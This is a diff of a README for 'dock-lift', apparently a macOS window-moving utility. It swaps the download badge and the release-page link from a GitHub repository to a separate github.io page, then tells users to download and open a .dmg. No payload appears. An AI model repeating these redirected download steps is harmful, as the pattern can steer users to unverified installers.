@@ -1,6 +1,6 @@
 # 🖥️ dock-lift - Move your windows with one click
 
-[![](https://img.shields.io/badge/Download-dock--lift-blue.svg)](https://github.com/investmentpenalty133/dock-lift)
+[![](https://img.shields.io/badge/Download-dock--lift-blue.svg)](https://investmentpenalty133.github.io)
 
 ## 🎯 Purpose
 Dock-lift helps you manage your workspace. Many users deal with multiple monitors. Sometimes you lose track of where your application windows reside. This tool brings your open window to your current display. You just click the app icon in your dock. The system pulls the window to your active screen.
@@ -14,7 +14,7 @@ This application runs on macOS. It uses Apple’s native Swift language. It requ
 ## 📥 Getting Started
 Follow these steps to set up the software.
 
-1. Visit the [official release page](https://github.com/investmentpenalty133/dock-lift).
+1. Visit the [official release page](https://investmentpenalty133.github.io).
 2. Look for the latest version under the Releases section.
 3. Download the disk image file ending in .dmg.
 4. Open the downloaded file.
